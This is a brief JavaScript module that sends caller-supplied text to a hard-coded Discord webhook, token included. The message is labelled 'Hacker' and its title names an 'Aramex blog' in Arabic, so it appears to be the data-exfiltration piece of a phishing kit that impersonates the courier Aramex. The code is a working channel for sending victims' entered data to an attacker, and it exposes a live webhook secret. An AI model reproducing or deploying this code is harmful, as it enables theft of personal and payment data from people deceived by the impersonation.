import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1329071719100448898/WAOKsind1mV5CcFGPOTeaSUkdnfCJ3prv9QWe9wQO5PqCer09UsPyB2GsAtVgszgWYLS",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
